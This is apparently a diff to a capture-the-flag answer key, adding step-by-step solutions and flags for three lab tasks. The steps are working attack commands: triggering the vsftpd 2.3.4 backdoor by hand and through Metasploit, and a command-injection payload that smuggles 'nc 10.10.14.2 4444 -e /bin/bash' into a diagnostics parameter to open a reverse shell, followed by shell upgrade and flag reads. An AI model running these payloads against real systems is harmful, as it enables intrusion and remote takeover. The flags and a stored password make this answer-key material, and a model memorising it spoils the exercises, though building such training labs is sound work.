@@ -497,5 +497,43 @@
     "submit": {
       "o3": "Summer2024!"
     }
+  },
+  "c06-m01": {
+    "steps": [
+      "nmap -sV -sC -p21 10.10.20.15",
+      "searchsploit vsftpd 2.3.4",
+      "ftp 10.10.20.15",
+      "hacker:)",
+      "nc 10.10.20.15 6200",
+      "cat /root/flag.txt"
+    ],
+    "submit": {
+      "o5": "FLAG{vsftpd_234_backdoor_is_still_out_there}"
+    }
+  },
+  "c06-m02": {
+    "steps": [
+      "nc -lvnp 4444",
+      "curl -s -b 'role=admin' -G --data-urlencode 'host=127.0.0.1; nc 10.10.14.2 4444 -e /bin/bash' http://shop.acme.test/admin/diagnostics",
+      "python3 -c \"import pty; pty.spawn('/bin/bash')\"",
+      "stty raw -echo",
+      "cat /var/www/shopzone/flag.txt"
+    ],
+    "submit": {
+      "o6": "FLAG{reverse_shell_from_command_injection}"
+    }
+  },
+  "c06-m03": {
+    "steps": [
+      "msfconsole",
+      "search vsftpd",
+      "use exploit/unix/ftp/vsftpd_234_backdoor",
+      "set RHOSTS 10.10.20.15",
+      "run",
+      "cat /root/flag.txt"
+    ],
+    "submit": {
+      "o6": "FLAG{vsftpd_234_backdoor_is_still_out_there}"
+    }
   }
 }
